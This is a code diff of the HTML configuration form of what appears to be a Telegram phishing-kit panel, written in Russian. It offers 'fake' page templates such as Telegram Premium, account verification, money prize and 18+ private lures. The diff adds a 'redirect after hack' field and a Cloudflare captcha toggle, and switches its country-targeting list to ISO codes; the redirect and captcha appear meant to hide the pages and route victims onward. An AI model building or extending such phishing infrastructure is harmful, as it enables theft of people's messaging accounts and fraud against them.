@@ -70,16 +70,16 @@
         <label for="" class="form__title">Шаблон фейка</label>
         <select id="page" class="form__input">
             <option value="">Выберите фейк</option>
-            <option value="Telegram Premium">Telegram Premium</option>
-            <option value="Верификация аккаунта">Верификация аккаунта</option>
-            <option value="Голос другу">Голос другу</option>
-            <option value="Денежный приз">Денежный приз</option>
-            <option value="Доступ к боту">Доступ к боту</option>
-            <option value="Забрать аккаунт">Забрать аккаунт</option>
-            <option value="Накрутка лайков">Накрутка лайков</option>
-            <option value="Приват 18+">Приват 18+</option>
-            <option value="Простой вход">Простой вход</option>
-            <option value="Участие в голосовании">Участие в голосовании</option>
+            <option value="tg-premium">Telegram Premium</option>
+            <option value="account-verf">Верификация аккаунта</option>
+            <option value="vote-friend">Голос другу</option>
+            <option value="money-prize">Денежный приз</option>
+            <option value="bot-access">Доступ к боту</option>
+            <option value="get-account">Забрать аккаунт</option>
+            <option value="likes">Накрутка лайков</option>
+            <option value="private">Приват 18+</option>
+            <option value="login">Простой вход</option>
+            <option value="votes">Участие в голосовании</option>
         </select>
 
         <label for="" class="form__title">Дополнительный ключ</label>
@@ -88,205 +88,212 @@
         <label for="" class="form__title">Редирект с главной домена</label>
         <input type="text" placeholder="Введите URL" class="form__input" id="redirect">
 
+        <label for="" class="form__title">Редирект после взлома</label>
+        <input type="text" placeholder="Введите URL" class="form__input" id="redirect_success">
+
+
+        <label for="" class="form__title">Включить защиту от ботов (Captcha Cloudflare)</label>
+        <input type="checkbox" class="form__checkbox" id="security">
+        
+
         <label for="" class="form__title">Выберите страны вашей аудитории (защита от DDOS)</label>
         <select class="js-select2" multiple="multiple" class="form__input">
-            <option data-badge="" value="Afghanistan">Afghanistan</option>
-            <option data-badge="" value="Albania">Albania</option>
-            <option data-badge="" value="Algeria">Algeria</option>
-            <option data-badge="" value="Andorra">Andorra</option>
-            <option data-badge="" value="Angola">Angola</option>
-            <option data-badge="" value="Antigua and Barbuda">Antigua and Barbuda</option>
-            <option data-badge="" value="Argentina">Argentina</option>
-            <option data-badge="" value="Armenia">Armenia</option>
-            <option data-badge="" value="Australia">Australia</option>
-            <option data-badge="" value="Austria">Austria</option>
-            <option data-badge="" value="Azerbaijan">Azerbaijan</option>
-            <option data-badge="" value="Bahamas">Bahamas</option>
-            <option data-badge="" value="Bahrain">Bahrain</option>
-            <option data-badge="" value="Bangladesh">Bangladesh</option>
-            <option data-badge="" value="Barbados">Barbados</option>
-            <option data-badge="" value="Belarus">Belarus</option>
-            <option data-badge="" value="Belgium">Belgium</option>
-            <option data-badge="" value="Belize">Belize</option>
-            <option data-badge="" value="Benin">Benin</option>
-            <option data-badge="" value="Bhutan">Bhutan</option>
-            <option data-badge="" value="Bolivia">Bolivia</option>
-            <option data-badge="" value="Bosnia and Herzegovina">Bosnia and Herzegovina</option>
-            <option data-badge="" value="Botswana">Botswana</option>
-            <option data-badge="" value="Brazil">Brazil</option>
-            <option data-badge="" value="Brunei">Brunei</option>
-            <option data-badge="" value="Bulgaria">Bulgaria</option>
-            <option data-badge="" value="Burkina Faso">Burkina Faso</option>
-            <option data-badge="" value="Burundi">Burundi</option>
-            <option data-badge="" value="Cabo Verde">Cabo Verde</option>
-            <option data-badge="" value="Cambodia">Cambodia</option>
-            <option data-badge="" value="Cameroon">Cameroon</option>
-            <option data-badge="" value="Canada">Canada</option>
-            <option data-badge="" value="Central African Republic">Central African Republic</option>
-            <option data-badge="" value="Chad">Chad</option>
-            <option data-badge="" value="Chile">Chile</option>
-            <option data-badge="" value="China">China</option>
-            <option data-badge="" value="Colombia">Colombia</option>
-            <option data-badge="" value="Comoros">Comoros</option>
-            <option data-badge="" value="Congo (Congo-Brazzaville)">Congo (Congo-Brazzaville)</option>
-            <option data-badge="" value="Costa Rica">Costa Rica</option>
-            <option data-badge="" value="Croatia">Croatia</option>
-            <option data-badge="" value="Cuba">Cuba</option>
-            <option data-badge="" value="Cyprus">Cyprus</option>
-            <option data-badge="" value="Czechia (Czech Republic)">Czechia (Czech Republic)</option>
-            <option data-badge="" value="Democratic Republic of the Congo">Democratic Republic of the Congo</option>
-            <option data-badge="" value="Denmark">Denmark</option>
-            <option data-badge="" value="Djibouti">Djibouti</option>
-            <option data-badge="" value="Dominica">Dominica</option>
-            <option data-badge="" value="Dominican Republic">Dominican Republic</option>
-            <option data-badge="" value="East Timor (Timor-Leste)">East Timor (Timor-Leste)</option>
-            <option data-badge="" value="Ecuador">Ecuador</option>
-            <option data-badge="" value="Egypt">Egypt</option>
-            <option data-badge="" value="El Salvador">El Salvador</option>
-            <option data-badge="" value="Equatorial Guinea">Equatorial Guinea</option>
-            <option data-badge="" value="Eritrea">Eritrea</option>
-            <option data-badge="" value="Estonia">Estonia</option>
-            <option data-badge="" value="Eswatini">Eswatini</option>
-            <option data-badge="" value="Ethiopia">Ethiopia</option>
-            <option data-badge="" value="Fiji">Fiji</option>
-            <option data-badge="" value="Finland">Finland</option>
-            <option data-badge="" value="France">France</option>
-            <option data-badge="" value="Gabon">Gabon</option>
-            <option data-badge="" value="Gambia">Gambia</option>
-            <option data-badge="" value="Georgia">Georgia</option>
-            <option data-badge="" value="Germany">Germany</option>
-            <option data-badge="" value="Ghana">Ghana</option>
-            <option data-badge="" value="Greece">Greece</option>
-            <option data-badge="" value="Grenada">Grenada</option>
-            <option data-badge="" value="Guatemala">Guatemala</option>
-            <option data-badge="" value="Guinea">Guinea</option>
-            <option data-badge="" value="Guinea-Bissau">Guinea-Bissau</option>
-            <option data-badge="" value="Guyana">Guyana</option>
-            <option data-badge="" value="Haiti">Haiti</option>
-            <option data-badge="" value="Holy See">Holy See</option>
-            <option data-badge="" value="Honduras">Honduras</option>
-            <option data-badge="" value="Hungary">Hungary</option>
-            <option data-badge="" value="Iceland">Iceland</option>
-            <option data-badge="" value="India">India</option>
-            <option data-badge="" value="Indonesia">Indonesia</option>
-            <option data-badge="" value="Iran">Iran</option>
-            <option data-badge="" value="Iraq">Iraq</option>
-            <option data-badge="" value="Ireland">Ireland</option>
-            <option data-badge="" value="Israel">Israel</option>
-            <option data-badge="" value="Italy">Italy</option>
-            <option data-badge="" value="Ivory Coast">Ivory Coast</option>
-            <option data-badge="" value="Jamaica">Jamaica</option>
-            <option data-badge="" value="Japan">Japan</option>
-            <option data-badge="" value="Jordan">Jordan</option>
-            <option data-badge="" value="Kazakhstan">Kazakhstan</option>
-            <option data-badge="" value="Kenya">Kenya</option>
-            <option data-badge="" value="Kiribati">Kiribati</option>
-            <option data-badge="" value="Kosovo">Kosovo</option>
-            <option data-badge="" value="Kuwait">Kuwait</option>
-            <option data-badge="" value="Kyrgyzstan">Kyrgyzstan</option>
-            <option data-badge="" value="Laos">Laos</option>
-            <option data-badge="" value="Latvia">Latvia</option>
-            <option data-badge="" value="Lebanon">Lebanon</option>
-            <option data-badge="" value="Lesotho">Lesotho</option>
-            <option data-badge="" value="Liberia">Liberia</option>
-            <option data-badge="" value="Libya">Libya</option>
-            <option data-badge="" value="Liechtenstein">Liechtenstein</option>
-            <option data-badge="" value="Lithuania">Lithuania</option>
-            <option data-badge="" value="Luxembourg">Luxembourg</option>
-            <option data-badge="" value="Madagascar">Madagascar</option>
-            <option data-badge="" value="Malawi">Malawi</option>
-            <option data-badge="" value="Malaysia">Malaysia</option>
-            <option data-badge="" value="Maldives">Maldives</option>
-            <option data-badge="" value="Mali">Mali</option>
-            <option data-badge="" value="Malta">Malta</option>
-            <option data-badge="" value="Marshall Islands">Marshall Islands</option>
-            <option data-badge="" value="Mauritania">Mauritania</option>
-            <option data-badge="" value="Mauritius">Mauritius</option>
-            <option data-badge="" value="Mexico">Mexico</option>
-            <option data-badge="" value="Micronesia">Micronesia</option>
-            <option data-badge="" value="Moldova">Moldova</option>
-            <option data-badge="" value="Monaco">Monaco</option>
-            <option data-badge="" value="Mongolia">Mongolia</option>
-            <option data-badge="" value="Montenegro">Montenegro</option>
-            <option data-badge="" value="Morocco">Morocco</option>
-            <option data-badge="" value="Mozambique">Mozambique</option>
-            <option data-badge="" value="Myanmar (formerly Burma)">Myanmar (formerly Burma)</option>
-            <option data-badge="" value="Namibia">Namibia</option>
-            <option data-badge="" value="Nauru">Nauru</option>
-            <option data-badge="" value="Nepal">Nepal</option>
-            <option data-badge="" value="Netherlands">Netherlands</option>
-            <option data-badge="" value="New Zealand">New Zealand</option>
-            <option data-badge="" value="Nicaragua">Nicaragua</option>
-            <option data-badge="" value="Niger">Niger</option>
-            <option data-badge="" value="Nigeria">Nigeria</option>
-            <option data-badge="" value="North Korea">North Korea</option>
-            <option data-badge="" value="North Macedonia (formerly Macedonia)">North Macedonia (formerly Macedonia)</option>
-            <option data-badge="" value="Norway">Norway</option>
-            <option data-badge="" value="Oman">Oman</option>
-            <option data-badge="" value="Pakistan">Pakistan</option>
-            <option data-badge="" value="Palau">Palau</option>
-            <option data-badge="" value="Palestine State">Palestine State</option>
-            <option data-badge="" value="Panama">Panama</option>
-            <option data-badge="" value="Papua New Guinea">Papua New Guinea</option>
-            <option data-badge="" value="Paraguay">Paraguay</option>
-            <option data-badge="" value="Peru">Peru</option>
-            <option data-badge="" value="Philippines">Philippines</option>
-            <option data-badge="" value="Poland">Poland</option>
-            <option data-badge="" value="Portugal">Portugal</option>
-            <option data-badge="" value="Qatar">Qatar</option>
-            <option data-badge="" value="Romania">Romania</option>
-            <option data-badge="" value="Russia">Russia</option>
-            <option data-badge="" value="Rwanda">Rwanda</option>
-            <option data-badge="" value="Saint Kitts and Nevis">Saint Kitts and Nevis</option>
-            <option data-badge="" value="Saint Lucia">Saint Lucia</option>
-            <option data-badge="" value="Saint Vincent and the Grenadines">Saint Vincent and the Grenadines</option>
-            <option data-badge="" value="Samoa">Samoa</option>
-            <option data-badge="" value="San Marino">San Marino</option>
-            <option data-badge="" value="Sao Tome and Principe">Sao Tome and Principe</option>
-            <option data-badge="" value="Saudi Arabia">Saudi Arabia</option>
-            <option data-badge="" value="Senegal">Senegal</option>
-            <option data-badge="" value="Serbia">Serbia</option>
-            <option data-badge="" value="Seychelles">Seychelles</option>
-            <option data-badge="" value="Sierra Leone">Sierra Leone</option>
-            <option data-badge="" value="Singapore">Singapore</option>
-            <option data-badge="" value="Slovakia">Slovakia</option>
-            <option data-badge="" value="Slovenia">Slovenia</option>
-            <option data-badge="" value="Solomon Islands">Solomon Islands</option>
-            <option data-badge="" value="Somalia">Somalia</option>
-            <option data-badge="" value="South Africa">South Africa</option>
-            <option data-badge="" value="South Korea">South Korea</option>
-            <option data-badge="" value="South Sudan">South Sudan</option>
-            <option data-badge="" value="Spain">Spain</option>
-            <option data-badge="" value="Sri Lanka">Sri Lanka</option>
-            <option data-badge="" value="Sudan">Sudan</option>
-            <option data-badge="" value="Suriname">Suriname</option>
-            <option data-badge="" value="Sweden">Sweden</option>
-            <option data-badge="" value="Switzerland">Switzerland</option>
-            <option data-badge="" value="Syria">Syria</option>
-            <option data-badge="" value="Tajikistan">Tajikistan</option>
-            <option data-badge="" value="Tanzania">Tanzania</option>
-            <option data-badge="" value="Thailand">Thailand</option>
-            <option data-badge="" value="Togo">Togo</option>
-            <option data-badge="" value="Tonga">Tonga</option>
-            <option data-badge="" value="Trinidad and Tobago">Trinidad and Tobago</option>
-            <option data-badge="" value="Tunisia">Tunisia</option>
-            <option data-badge="" value="Turkey">Turkey</option>
-            <option data-badge="" value="Turkmenistan">Turkmenistan</option>
-            <option data-badge="" value="Tuvalu">Tuvalu</option>
-            <option data-badge="" value="Uganda">Uganda</option>
-            <option data-badge="" value="Ukraine">Ukraine</option>
-            <option data-badge="" value="United Arab Emirates">United Arab Emirates</option>
-            <option data-badge="" value="United Kingdom">United Kingdom</option>
-            <option data-badge="" value="United States of America">United States of America</option>
-            <option data-badge="" value="Uruguay">Uruguay</option>
-            <option data-badge="" value="Uzbekistan">Uzbekistan</option>
-            <option data-badge="" value="Vanuatu">Vanuatu</option>
-            <option data-badge="" value="Venezuela">Venezuela</option>
-            <option data-badge="" value="Vietnam">Vietnam</option>
-            <option data-badge="" value="Yemen">Yemen</option>
-            <option data-badge="" value="Zambia">Zambia</option>
-            <option data-badge="" value="Zimbabwe">Zimbabwe</option>
-
+            <option data-badge="" value="AF">Afghanistan</option>
+            <option data-badge="" value="AL">Albania</option>
+            <option data-badge="" value="DZ">Algeria</option>
+            <option data-badge="" value="AD">Andorra</option>
+            <option data-badge="" value="AO">Angola</option>
+            <option data-badge="" value="AG">Antigua and Barbuda</option>
+            <option data-badge="" value="AR">Argentina</option>
+            <option data-badge="" value="AM">Armenia</option>
+            <option data-badge="" value="AU">Australia</option>
+            <option data-badge="" value="AT">Austria</option>
+            <option data-badge="" value="AZ">Azerbaijan</option>
+            <option data-badge="" value="BS">Bahamas</option>
+            <option data-badge="" value="BH">Bahrain</option>
+            <option data-badge="" value="BD">Bangladesh</option>
+            <option data-badge="" value="BB">Barbados</option>
+            <option data-badge="" value="BY">Belarus</option>
+            <option data-badge="" value="BE">Belgium</option>
+            <option data-badge="" value="BZ">Belize</option>
+            <option data-badge="" value="BJ">Benin</option>
+            <option data-badge="" value="BT">Bhutan</option>
+            <option data-badge="" value="BO">Bolivia</option>
+            <option data-badge="" value="BA">Bosnia and Herzegovina</option>
+            <option data-badge="" value="BW">Botswana</option>
+            <option data-badge="" value="BR">Brazil</option>
+            <option data-badge="" value="BN">Brunei</option>
+            <option data-badge="" value="BG">Bulgaria</option>
+            <option data-badge="" value="BF">Burkina Faso</option>
+            <option data-badge="" value="BI">Burundi</option>
+            <option data-badge="" value="CV">Cabo Verde</option>
+            <option data-badge="" value="KH">Cambodia</option>
+            <option data-badge="" value="CM">Cameroon</option>
+            <option data-badge="" value="CA">Canada</option>
+            <option data-badge="" value="CF">Central African Republic</option>
+            <option data-badge="" value="TD">Chad</option>
+            <option data-badge="" value="CL">Chile</option>
+            <option data-badge="" value="CN">China</option>
+            <option data-badge="" value="CO">Colombia</option>
+            <option data-badge="" value="KM">Comoros</option>
+            <option data-badge="" value="CG">Congo (Congo-Brazzaville)</option>
+            <option data-badge="" value="CR">Costa Rica</option>
+            <option data-badge="" value="HR">Croatia</option>
+            <option data-badge="" value="CU">Cuba</option>
+            <option data-badge="" value="CY">Cyprus</option>
+            <option data-badge="" value="CZ">Czechia (Czech Republic)</option>
+            <option data-badge="" value="CD">Democratic Republic of the Congo</option>
+            <option data-badge="" value="DK">Denmark</option>
+            <option data-badge="" value="DJ">Djibouti</option>
+            <option data-badge="" value="DM">Dominica</option>
+            <option data-badge="" value="DO">Dominican Republic</option>
+            <option data-badge="" value="TL">East Timor (Timor-Leste)</option>
+            <option data-badge="" value="EC">Ecuador</option>
+            <option data-badge="" value="EG">Egypt</option>
+            <option data-badge="" value="SV">El Salvador</option>
+            <option data-badge="" value="GQ">Equatorial Guinea</option>
+            <option data-badge="" value="ER">Eritrea</option>
+            <option data-badge="" value="EE">Estonia</option>
+            <option data-badge="" value="SZ">Eswatini</option>
+            <option data-badge="" value="ET">Ethiopia</option>
+            <option data-badge="" value="FJ">Fiji</option>
+            <option data-badge="" value="FI">Finland</option>
+            <option data-badge="" value="FR">France</option>
+            <option data-badge="" value="GA">Gabon</option>
+            <option data-badge="" value="GM">Gambia</option>
+            <option data-badge="" value="GE">Georgia</option>
+            <option data-badge="" value="DE">Germany</option>
+            <option data-badge="" value="GH">Ghana</option>
+            <option data-badge="" value="GR">Greece</option>
+            <option data-badge="" value="GD">Grenada</option>
+            <option data-badge="" value="GT">Guatemala</option>
+            <option data-badge="" value="GN">Guinea</option>
+            <option data-badge="" value="GW">Guinea-Bissau</option>
+            <option data-badge="" value="GY">Guyana</option>
+            <option data-badge="" value="HT">Haiti</option>
+            <option data-badge="" value="VA">Holy See</option>
+            <option data-badge="" value="HN">Honduras</option>
+            <option data-badge="" value="HU">Hungary</option>
+            <option data-badge="" value="IS">Iceland</option>
+            <option data-badge="" value="IN">India</option>
+            <option data-badge="" value="ID">Indonesia</option>
+            <option data-badge="" value="IR">Iran</option>
+            <option data-badge="" value="IQ">Iraq</option>
+            <option data-badge="" value="IE">Ireland</option>
+            <option data-badge="" value="IL">Israel</option>
+            <option data-badge="" value="IT">Italy</option>
+            <option data-badge="" value="CI">Ivory Coast</option>
+            <option data-badge="" value="JM">Jamaica</option>
+            <option data-badge="" value="JP">Japan</option>
+            <option data-badge="" value="JO">Jordan</option>
+            <option data-badge="" value="KZ">Kazakhstan</option>
+            <option data-badge="" value="KE">Kenya</option>
+            <option data-badge="" value="KI">Kiribati</option>
+            <option data-badge="" value="XK">Kosovo</option>
+            <option data-badge="" value="KW">Kuwait</option>
+            <option data-badge="" value="KG">Kyrgyzstan</option>
+            <option data-badge="" value="LA">Laos</option>
+            <option data-badge="" value="LV">Latvia</option>
+            <option data-badge="" value="LB">Lebanon</option>
+            <option data-badge="" value="LS">Lesotho</option>
+            <option data-badge="" value="LR">Liberia</option>
+            <option data-badge="" value="LY">Libya</option>
+            <option data-badge="" value="LI">Liechtenstein</option>
+            <option data-badge="" value="LT">Lithuania</option>
+            <option data-badge="" value="LU">Luxembourg</option>
+            <option data-badge="" value="MG">Madagascar</option>
+            <option data-badge="" value="MW">Malawi</option>
+            <option data-badge="" value="MY">Malaysia</option>
+            <option data-badge="" value="MV">Maldives</option>
+            <option data-badge="" value="ML">Mali</option>
+            <option data-badge="" value="MT">Malta</option>
+            <option data-badge="" value="MH">Marshall Islands</option>
+            <option data-badge="" value="MR">Mauritania</option>
+            <option data-badge="" value="MU">Mauritius</option>
+            <option data-badge="" value="MX">Mexico</option>
+            <option data-badge="" value="FM">Micronesia</option>
+            <option data-badge="" value="MD">Moldova</option>
+            <option data-badge="" value="MC">Monaco</option>
+            <option data-badge="" value="MN">Mongolia</option>
+            <option data-badge="" value="ME">Montenegro</option>
+            <option data-badge="" value="MA">Morocco</option>
+            <option data-badge="" value="MZ">Mozambique</option>
+            <option data-badge="" value="MM">Myanmar (formerly Burma)</option>
+            <option data-badge="" value="NA">Namibia</option>
+            <option data-badge="" value="NR">Nauru</option>
+            <option data-badge="" value="NP">Nepal</option>
+            <option data-badge="" value="NL">Netherlands</option>
+            <option data-badge="" value="NZ">New Zealand</option>
+            <option data-badge="" value="NI">Nicaragua</option>
+            <option data-badge="" value="NE">Niger</option>
+            <option data-badge="" value="NG">Nigeria</option>
+            <option data-badge="" value="KP">North Korea</option>
+            <option data-badge="" value="MK">North Macedonia (formerly Macedonia)</option>
+            <option data-badge="" value="NO">Norway</option>
+            <option data-badge="" value="OM">Oman</option>
+            <option data-badge="" value="PK">Pakistan</option>
+            <option data-badge="" value="PW">Palau</option>
+            <option data-badge="" value="PS">Palestine State</option>
+            <option data-badge="" value="PA">Panama</option>
+            <option data-badge="" value="PG">Papua New Guinea</option>
+            <option data-badge="" value="PY">Paraguay</option>
+            <option data-badge="" value="PE">Peru</option>
+            <option data-badge="" value="PH">Philippines</option>
+            <option data-badge="" value="PL">Poland</option>
+            <option data-badge="" value="PT">Portugal</option>
+            <option data-badge="" value="QA">Qatar</option>
+            <option data-badge="" value="RO">Romania</option>
+            <option data-badge="" value="RU">Russia</option>
+            <option data-badge="" value="RW">Rwanda</option>
+            <option data-badge="" value="KN">Saint Kitts and Nevis</option>
+            <option data-badge="" value="LC">Saint Lucia</option>
+            <option data-badge="" value="VC">Saint Vincent and the Grenadines</option>
+            <option data-badge="" value="WS">Samoa</option>
+            <option data-badge="" value="SM">San Marino</option>
+            <option data-badge="" value="ST">Sao Tome and Principe</option>
+            <option data-badge="" value="SA">Saudi Arabia</option>
+            <option data-badge="" value="SN">Senegal</option>
+            <option data-badge="" value="RS">Serbia</option>
+            <option data-badge="" value="SC">Seychelles</option>
+            <option data-badge="" value="SL">Sierra Leone</option>
+            <option data-badge="" value="SG">Singapore</option>
+            <option data-badge="" value="SK">Slovakia</option>
+            <option data-badge="" value="SI">Slovenia</option>
+            <option data-badge="" value="SB">Solomon Islands</option>
+            <option data-badge="" value="SO">Somalia</option>
+            <option data-badge="" value="ZA">South Africa</option>
+            <option data-badge="" value="KR">South Korea</option>
+            <option data-badge="" value="SS">South Sudan</option>
+            <option data-badge="" value="ES">Spain</option>
+            <option data-badge="" value="LK">Sri Lanka</option>
+            <option data-badge="" value="SD">Sudan</option>
+            <option data-badge="" value="SR">Suriname</option>
+            <option data-badge="" value="SE">Sweden</option>
+            <option data-badge="" value="CH">Switzerland</option>
+            <option data-badge="" value="SY">Syria</option>
+            <option data-badge="" value="TJ">Tajikistan</option>
+            <option data-badge="" value="TZ">Tanzania</option>
+            <option data-badge="" value="TH">Thailand</option>
+            <option data-badge="" value="TG">Togo</option>
+            <option data-badge="" value="TO">Tonga</option>
+            <option data-badge="" value="TT">Trinidad and Tobago</option>
+            <option data-badge="" value="TN">Tunisia</option>
+            <option data-badge="" value="TR">Turkey</option>
+            <option data-badge="" value="TM">Turkmenistan</option>
+            <option data-badge="" value="TV">Tuvalu</option>
+            <option data-badge="" value="UG">Uganda</option>
+            <option data-badge="" value="UA">Ukraine</option>
+            <option data-badge="" value="AE">United Arab Emirates</option>
+            <option data-badge="" value="GB">United Kingdom</option>
+            <option data-badge="" value="US">United States of America</option>
+            <option data-badge="" value="UY">Uruguay</option>
+            <option data-badge="" value="UZ">Uzbekistan</option>
+            <option data-badge="" value="VU">Vanuatu</option>
+            <option data-badge="" value="VE">Venezuela</option>
+            <option data-badge="" value="VN">Vietnam</option>
+            <option data-badge="" value="YE">Yemen</option>
+            <option data-badge="" value="ZM">Zambia</option>
+            <option data-badge="" value="ZW">Zimbabwe</option>
         </select>
 
         <input type="submit" class="form__button btn" value="Добавить">
